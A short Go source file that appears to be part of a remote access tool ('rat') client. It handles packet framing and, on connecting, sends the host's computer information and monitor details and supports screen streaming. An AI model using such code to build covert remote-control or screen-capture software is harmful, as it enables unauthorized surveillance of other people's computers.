package main

import (
	"encoding/binary"
	"net"
	"rat/common"
	"rat/network"
)

type Connection struct {
	net.Conn
	network.Writer
	network.Reader
}

var Queue chan network.OutgoingPacket

func (c *Connection) Init() {
	Queue <- ComputerInfoPacket{}
	Queue <- MonitorsPacket{}
}

func (c *Connection) Close() {
	screenStream = false

	c.Conn.Close()
}

func (c *Connection) ReadHeader() (common.PacketHeader, error) {
	var h common.PacketHeader
	err := binary.Read(c, common.ByteOrder, &h)

	return h, err
}

func (c *Connection) WriteHeader(header common.PacketHeader) error {
	return binary.Write(c.Conn, common.ByteOrder, header)
}

func (c *Connection) WritePacket(packet network.OutgoingPacket) error {
	err := c.WriteHeader(packet.Header())

	if err != nil {
		return err
	}

	return c.Writer.WritePacket(packet)
}
